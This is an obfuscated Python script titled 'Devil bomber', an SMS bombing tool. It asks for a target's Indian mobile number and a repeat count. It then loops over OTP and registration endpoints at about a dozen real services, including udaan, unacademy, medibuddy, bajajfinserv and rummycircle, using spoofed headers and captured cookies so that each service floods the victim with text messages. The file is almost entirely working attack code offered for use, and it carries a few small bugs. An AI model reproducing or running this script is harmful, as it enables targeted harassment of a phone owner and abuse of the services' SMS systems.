
#===========================================||
#================PROJECT INFO===============||
#===========================================||
#==== Auther : SM02 PresenT ================||
#==== Start Date : 10/12/2023 ==============||
#==== Version : 2.0 BETA ===================||
#==== About :  Sms  bomber =================||
#==== Requremnts : fake_useragent,requests =||
#==== Note : Do Not Copy This Code , =======||
#===========================================||
#================END INFO===================||
#===========================================||

license = '''
MIT License
Copyright (c) 2020 - 2023 The  SM02

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE. 
         if You Have Any Problem Contact Me On telegram : simplehacker1
         
  
'''
print(license)

import requests ,json ,time #line:1
from fake_useragent import UserAgent #line:2
ua =UserAgent ()#line:3
myip =requests .get ('https://www.wikipedia.org').headers ['X-Client-IP']#line:6
def logo ():#line:8
    print ("\033[31m")#line:10
    print ("██████╗░███████╗██╗░░░██╗██╗██╗░░░░░  ██████╗░░█████╗░███╗░░░███╗██████╗░███████╗██████╗░")#line:12
    print ("██╔══██╗██╔════╝██║░░░██║██║██║░░░░░  ██╔══██╗██╔══██╗████╗░████║██╔══██╗██╔════╝██╔══██╗")#line:13
    print ("██║░░██║█████╗░░╚██╗░██╔╝██║██║░░░░░  ██████╦╝██║░░██║██╔████╔██║██████╦╝█████╗░░██████╔╝")#line:14
    print ("██║░░██║██╔══╝░░░╚████╔╝░██║██║░░░░░  ██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗")#line:15
    print ("██████╔╝███████╗░░╚██╔╝░░██║███████╗  ██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║")#line:16
    print ("╚═════╝░╚══════╝░░░╚═╝░░░╚═╝╚══════╝  ╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝")#line:17
    print (" Your IP is : "+myip )#line:18
    print (" \033[33m  Devil bomber  \n")#line:19
def smsm (OOOOO00000000O0O0 ,O000O0O0O0OO0OO0O ):#line:22
    O000O0O0O0OO0OO0O =int (O000O0O0O0OO0OO0O )#line:24
    OO00OO000O0OO0OOO =ua .chrome #line:26
    for OOO000OOOOO0O0OO0 in range (O000O0O0O0OO0OO0O ):#line:27
        OOOOO00000000O0O0 =str (OOOOO00000000O0O0 )#line:28
        O0O0O00O0OO000O0O ={'Host':'auth.udaan.com','content-length':'17','x-app-id':'udaan-auth','traceparent':'00-94a6e0bccbb332c53f129ca9ef6e71b8-adcc060214b06b40-00','accept-language':'en-IN','user-agent':OO00OO000O0OO0OOO ,'content-type':'application/x-www-form-urlencoded;charset=UTF-8','accept':'*/*','origin':'https://auth.udaan.com','x-requested-with':'pure.lite.browser','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://auth.udaan.com/login/v2/mobile?cid=udaan-v2&cb=https%3A%2F%2Fudaan.com%2F_login%2Fcb&v=2','accept-encoding':'gzip, deflate, br','cookie':'sid=VwCKAOdskvwBAMG2xSZrbZL8vd99bdRvTMx/Z/YD4NhfjkbIZf2IzF7TQ902OazS9KIv2orueg81btncDxMM1rbq',}#line:46
        OO000O0000OO000O0 =(('client_id','udaan-v2'),)#line:50
        O00000OOOO00O0O0O ={'mobile':OOOOO00000000O0O0 }#line:54
        OO0O000OOOO000OOO =requests .post ('https://auth.udaan.com/api/otp/send',headers =O0O0O00O0OO000O0O ,params =OO000O0000OO000O0 ,data =O00000OOOO00O0O0O );pass #line:56
        O0O0O00O0OO000O0O ={'Host':'udaan.com','content-length':'29','accept':'application/json, text/javascript, */*; q=0.01','x-requested-with':'XMLHttpRequest','user-agent':OO00OO000O0OO0OOO ,'content-type':'application/x-www-form-urlencoded; charset=UTF-8','origin':'https://udaan.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://udaan.com/login','accept-encoding':'gzip, deflate, br','accept-language':'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7','cookie':'s=1kj2b02sprzis1rfarco1px4we',}#line:74
        OO000O0000OO000O0 =(('cmd','send'),)#line:78
        O00000OOOO00O0O0O ={'try_count':'0','mobile':OOOOO00000000O0O0 }#line:83
        OO0O000OOOO000OOO =requests .post ('https://udaan.com/login',headers =O0O0O00O0OO000O0O ,params =OO000O0000OO000O0 ,data =O00000OOOO00O0O0O );pass #line:85
        O0O0O00O0OO000O0O ={'Host':'api.penpencil.co','content-length':'75','client-version':'2.4.13','user-agent':OO00OO000O0OO0OOO ,'content-type':'application/json','accept':'application/json, text/plain, */*','randomid':'f518c78d-f241-4db0-a891-9f6524c710b4','client-id':'5eb393ee95fab7468a79d189','client-type':'WEB','origin':'https://www.pw.live','x-requested-with':'pure.lite.browser','sec-fetch-site':'cross-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.pw.live/','accept-encoding':'gzip, deflate, br','accept-language':'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',}#line:109
        O00000OOOO00O0O0O ='{"mobile": "1234", "countryCode": "+91", "firstName": "Sss", "lastName": ""}'#line:111
        O00000OOOO00O0O0O =O00000OOOO00O0O0O .replace ('1234',str (OOOOO00000000O0O0 ))#line:112
        OO0O000OOOO000OOO =requests .post ('https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189',headers =O0O0O00O0OO000O0O ,data =O00000OOOO00O0O0O );pass #line:114
        O0O0O00O0OO000O0O ={'Host':'api.penpencil.co','content-length':'75','client-version':'2.4.13','user-agent':OO00OO000O0OO0OOO ,'content-type':'application/json','accept':'application/json, text/plain, */*','randomid':'f518c78d-f241-4db0-a891-9f6524c710b4','client-id':'5eb393ee95fab7468a79d189','client-type':'WEB','origin':'https://www.pw.live','x-requested-with':'pure.lite.browser','sec-fetch-site':'cross-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.pw.live/','accept-encoding':'gzip, deflate, br','accept-language':'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',}#line:138
        O00000OOOO00O0O0O ='{"mobile":"'+OOOOO00000000O0O0 +'","countryCode":"+91","firstName":"Sss","lastName":""}'#line:140
        OO0O000OOOO000OOO =requests .post ('https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189',headers =O0O0O00O0OO000O0O ,data =O00000OOOO00O0O0O );pass #line:142
        O0O0O00O0OO000O0O ={'Host':'api.toolsvilla.com','content-length':'66','accept':'application/json, text/plain, */*','pageurl':'/?gad_source=1&gclid=EAIaIQobChMIqLni4dvuggMVfyR7Bx0LXQcaEAAYASAAEgJY3PD_BwE','user-agent':OO00OO000O0OO0OOO ,'content-type':'application/json','origin':'https://www.toolsvilla.com','x-requested-with':'pure.lite.browser','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.toolsvilla.com/','accept-encoding':'gzip, deflate, br','accept-language':'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',}#line:160
        O00000OOOO00O0O0O ='{"firstname":"","mobileno":"'+OOOOO00000000O0O0 +'","email":"","wtpSubs":"true"}'#line:162
        OO0O000OOOO000OOO =requests .post ('https://api.toolsvilla.com/web/register',headers =O0O0O00O0OO000O0O ,data =O00000OOOO00O0O0O );pass #line:164
        O0O0O00O0OO000O0O ={'Host':'goplus.in','Connection':'keep-alive','Content-Length':'67','deviceId':'abc','User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','Content-Type':'application/json;charset=UTF-8','Accept':'application/json','deviceVersion':'0','platform':'ANDROID','appVersion':'v1.0','Origin':'https://mobile.shuttltech.com','X-Requested-With':'pure.lite.browser','Sec-Fetch-Site':'cross-site','Sec-Fetch-Mode':'cors','Sec-Fetch-Dest':'empty','Referer':'https://mobile.shuttltech.com/','Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',}#line:187
        O00000OOOO00O0O0O ='{"phoneNumber":"'+OOOOO00000000O0O0 +'","newDevice":"false","policyPerused":true}'#line:189
        OO0O000OOOO000OOO =requests .post ('https://goplus.in/v3/auth/user/otp',headers =O0O0O00O0OO000O0O ,data =O00000OOOO00O0O0O );pass #line:191
        O0O0O00O0OO000O0O ={'Host':'api.cureskin.com','content-length':'299','baggage':'sentry-environment=production,sentry-release=app%402.0.462,sentry-public_key=f50a2ba984c66e974c85651f3672ff35,sentry-trace_id=6c8710e4d4ae4b8c9d4386cb86768fc3','user-agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','sentry-trace':'6c8710e4d4ae4b8c9d4386cb86768fc3-93f53738ec36fd4f-0','content-type':'text/plain','accept':'*/*','origin':'https://app.cureskin.com','x-requested-with':'pure.lite.browser','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://app.cureskin.com/','accept-encoding':'gzip, deflate, br','accept-language':'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',}#line:209
        O00000OOOO00O0O0O ='{"mobileNumber":"'+OOOOO00000000O0O0 +'","deviceId":"f63754ef4d120ddb59d4","source":"web","time":"2023-12-01T16:29:33.767Z","digest":"ce95fea5ec919a57325732a7fbdec2d75232ec27a95ecc28f7bf7e04e70e55f6","_ApplicationId":"myAppId","_ClientVersion":"js3.4.4","_InstallationId":"12d7f289-c92d-4ce8-9e77-ad3bf4deaf8f"}'#line:211
        OO0O000OOOO000OOO =requests .post ('https://api.cureskin.com/api/parse/functions/requestOTP',headers =O0O0O00O0OO000O0O ,data =O00000OOOO00O0O0O );pass #line:213
        O0O0O00O0OO000O0O ={'Host':'loginprod.medibuddy.in','content-length':'202','accept':'application/json, text/plain, */*','user-agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','content-type':'application/json','origin':'https://www.medibuddy.in','x-requested-with':'pure.lite.browser','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.medibuddy.in/','accept-encoding':'gzip, deflate, br','accept-language':'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',}#line:229
        O00000OOOO00O0O0O ='{"source":"medibuddyInWeb","platform":"medibuddy","phonenumber":"'+OOOOO00000000O0O0 +'","flow":"Retail-Login-Home-Flow","idealLoginFlow":false,"advertiserId":"8f191ec6-b5c8-Ld51-830f-65892ff7fb13","mbUserId":null}'#line:231
        OO0O000OOOO000OOO =requests .post ('https://loginprod.medibuddy.in/unified-login/user/register',headers =O0O0O00O0OO000O0O ,data =O00000OOOO00O0O0O );pass #line:233
        O0O0O00O0OO000O0O ={'Host':'unacademy.com','content-length':'107','x-platform':'7','user-agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','content-type':'application/json','accept':'*/*','origin':'https://unacademy.com','x-requested-with':'pure.lite.browser','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://unacademy.com/login?redirectTo=%2Fsettings','accept-encoding':'gzip, deflate, br','accept-language':'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7','cookie':'anonymous_session_id=aae2b19d_5c59_44ba_aa88_f50a8b49ffd5',}#line:251
        OO000O0000OO000O0 =(('enable-email','true'),)#line:255
        O00000OOOO00O0O0O ='{"phone":"'+OOOOO00000000O0O0 +'","country_code":"IN","otp_type":1,"email":"","send_otp":"true","is_un_teach_user":false}'#line:257
        OO0O000OOOO000OOO =requests .post ('https://unacademy.com/api/v3/user/user_check/',headers =O0O0O00O0OO000O0O ,params =OO000O0000OO000O0 ,data =O00000OOOO00O0O0O );pass #line:259
        O00O0O000OO0O000O ={'cookie:campaignCookienew':'{"utm_medium":"bfl","utm_campaign":NA,"utm_keyword":NA,"utm_content":NA,"utm_source":"organic_myaccount"}',}#line:267
        O0O0O00O0OO000O0O ={'Host':'www.bajajfinserv.in','content-length':'136','tracestate':'2442591@nr=0-1-2364187-1120225423-a1676216f73520a0----1701447794700','traceparent':'00-53e72ff78740605b404c2a4ce9009e00-a1676216f73520a0-01','user-agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','newrelic':'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjIzNjQxODciLCJhcCI6IjExMjAyMjU0MjMiLCJpZCI6ImExNjc2MjE2ZjczNTIwYTAiLCJ0ciI6IjUzZTcyZmY3ODc0MDYwNWI0MDRjMmE0Y2U5MDA5ZTAwIiwidGkiOjE3MDE0NDc3OTQ3MDAsInRrIjoiMjQ0MjU5MSJ9fQ==','content-type':'application/x-www-form-urlencoded; charset=UTF-8','accept':'*/*','x-requested-with':'XMLHttpRequest','request-id':'|0f55808691fe4f568fde7ae869c35b20.a2f8bbb358924c93','origin':'https://www.bajajfinserv.in','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.bajajfinserv.in/myaccountlogin/','accept-encoding':'gzip, deflate, br','accept-language':'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7','cookie':'kampyleSessionPageCounter=1',}#line:288
        O00000OOOO00O0O0O ={'CLType':'INDIVIDUAL','Mobile_Email':OOOOO00000000O0O0 ,'DOB':'','Pan_No':'','IP':'','Device':'','Device_Info':'','Browser_Type':'Safari','Source':'Login','LoginType':'1','EventClick':''}#line:302
        OO0O000OOOO000OOO =requests .post ('https://www.bajajfinserv.in/MyAccountLogin/Login/GetOTP',headers =O0O0O00O0OO000O0O ,cookies =O00O0O000OO0O000O ,data =O00000OOOO00O0O0O );pass #line:304
        O0O0O00O0OO000O0O ={'Host':'www.my11circle.com','content-length':'123','cache-control':'max-age=0','user-agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','content-type':'application/json','accept':'*/*','origin':'https://www.my11circle.com','x-requested-with':'pure.lite.browser','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.my11circle.com/player/login.html','accept-encoding':'gzip, deflate, br','accept-language':'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7','cookie':'ga24x7_pixeltracker=from_page%3Dlogin.html%26referrer_url%3D',}#line:324
        O00000OOOO00O0O0O ='{"mobile":"'+OOOOO00000000O0O0 +'","deviceId":"03aa8dc4-6f14-4ac1-aa16-f64fe5f250a1","deviceName":"","refCode":"","isPlaycircle":false}'#line:325
        OO0O000OOOO000OOO =requests .post ('https://www.my11circle.com/api/fl/auth/v3/getOtp',headers =O0O0O00O0OO000O0O ,data =O00000OOOO00O0O0O );pass #line:326
        O0O0O00O0OO000O0O ={'Host':'www.rummycircle.com','content-length':'123','cache-control':'max-age=0','user-agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','content-type':'application/json','accept':'*/*','origin':'https://www.rummycircle.com','x-requested-with':'pure.lite.browser','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.rummycircle.com/loginnow.html','accept-encoding':'gzip, deflate, br','accept-language':'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7','cookie':'AWSALBCORS=1tS0LdJM+fFwf4IHgfQpZbU6wVU1Rd6+xr7qaWCxlF1jYyVHAvY2I2Fua8JNR5whrvS/xBuubwutIJi+o4mDObqaVQKCCTZ99oMcFQSLtfGniKBTsRwSYvbBa8af',}#line:344
        O00000OOOO00O0O0O ='{"mobile":"'+OOOOO00000000O0O0 +'","deviceId":"6ebd671c-a5f7-4baa-904b-89d4f898ee79","deviceName":"","refCode":"","isPlaycircle":false}'#line:346
        OO0O000OOOO000OOO =requests .post ('https://www.rummycircle.com/api/fl/auth/v3/getOtp',headers =O0O0O00O0OO000O0O ,data =O00000OOOO00O0O0O );pass #line:348
        O0O0O00O0OO000O0O ={'Host':'api.khelbro.com','content-length':'42','accept':'application/json, text/plain, */*','x-auth-token':'undefined','user-agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','content-type':'application/json','origin':'https://khelbro.com','x-requested-with':'pure.lite.browser','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://khelbro.com/','accept-encoding':'gzip, deflate, br','accept-language':'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',}#line:365
        O00000OOOO00O0O0O ='{"mobile":"1234456","retryType":"text"}'#line:367
        O00000OOOO00O0O0O =O00000OOOO00O0O0O .replace ("1234456",str (OOOOO00000000O0O0 ))#line:368
        OO0O000OOOO000OOO =requests .post ('https://api.khelbro.com/api/v2/auth/resendOtp',headers =O0O0O00O0OO000O0O ,data =O00000OOOO00O0O0O )#line:370
    print ('\nBoombing done\n')#line:372
    auther ()#line:373
def spam ():#line:376
    try :#line:378
        OOOO0O0O000O0O000 =int (input ("\nEnter target No : +91"))#line:379
        O00OOOOO0000OO00O =int (input ("\nEnter how many times to repeat: "))#line:380
        if len (str (OOOO0O0O000O0O000 ))==10 :#line:381
            print (O00OOOOO0000OO00O )#line:382
            if O00OOOOO0000OO00O >0 :#line:383
                print ("\nBombing Started\nCtrl + C to close")#line:384
                smsm (number =OOOO0O0O000O0O000 ,repeat =O00OOOOO0000OO00O )#line:385
            else :#line:386
                print ("\nBombing Started\nCtrl + C to close")#line:387
                smsm (number =OOOO0O0O000O0O000 ,repeat ='1')#line:388
        else :#line:390
            print ("Input should be exactly 10 digit.")#line:391
            time .sleep (1 )#line:392
            spam ()#line:393
    except ValueError :#line:396
        print ("Please enter valid integer inputs.")#line:397
        time .sleep (1 )#line:398
        spam ()#line:399
def auther ():#line:402
    print ("██████╗░███████╗██╗░░░██╗██╗██╗░░░░░  ██████╗░░█████╗░███╗░░░███╗██████╗░███████╗██████╗░")#line:403
    print ("██╔══██╗██╔════╝██║░░░██║██║██║░░░░░  ██╔══██╗██╔══██╗████╗░████║██╔══██╗██╔════╝██╔══██╗")#line:404
    print ("██║░░██║█████╗░░╚██╗░██╔╝██║██║░░░░░  ██████╦╝██║░░██║██╔████╔██║██████╦╝█████╗░░██████╔╝")#line:405
    print ("██║░░██║██╔══╝░░░╚████╔╝░██║██║░░░░░  ██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗")#line:406
    print ("██████╔╝███████╗░░╚██╔╝░░██║███████╗  ██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║")#line:407
    print ("╚═════╝░╚══════╝░░░╚═╝░░░╚═╝╚══════╝  ╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝")#line:408
    print ("\033[31m   SM02 PRESENT \n")#line:410
    print ("\n")#line:411
    time .sleep (1 )#line:412
    exit #line:413
def menu ():#line:415
    logo ()#line:416
    print ("\033[31m    ╔════════════════╗")#line:417
    print ("\033[31m    ║✧ 1\033[32m mix bomb    \033[31m║")#line:418
    print ("\033[31m    ║✧ 2\033[32m update      \033[31m║")#line:419
    print ("\033[31m    ║✧ 3\033[32m Auther      \033[31m║")#line:420
    print ("\033[31m    ╚✧ 4\033[32m Exit       \033[31m✧╝")#line:421
    O00000O0O000000O0 =input ("    \nEnter Your Choice : ")#line:422
    if (O00000O0O000000O0 =="1"):#line:423
        time .sleep (1 )#line:424
        spam ()#line:425
    elif (O00000O0O000000O0 =="2"):#line:426
        print ("\033[31m commin soon\033[31m")#line:427
        time .sleep (1 )#line:428
        menu ()#line:429
    elif (O00000O0O000000O0 =="3"):#line:432
        auther ()#line:433
    elif (O00000O0O000000O0 =="4"):#line:434
        logo ()#line:435
        print ("Thanks For using My tool")#line:436
        exit ()#line:437
    else :#line:438
        print ("\n Please choice in 1 to 6")#line:439
        time .sleep (1 )#line:440
        menu ()#line:441
if __name__ =="__main__":#line:444
    menu ()#line:445
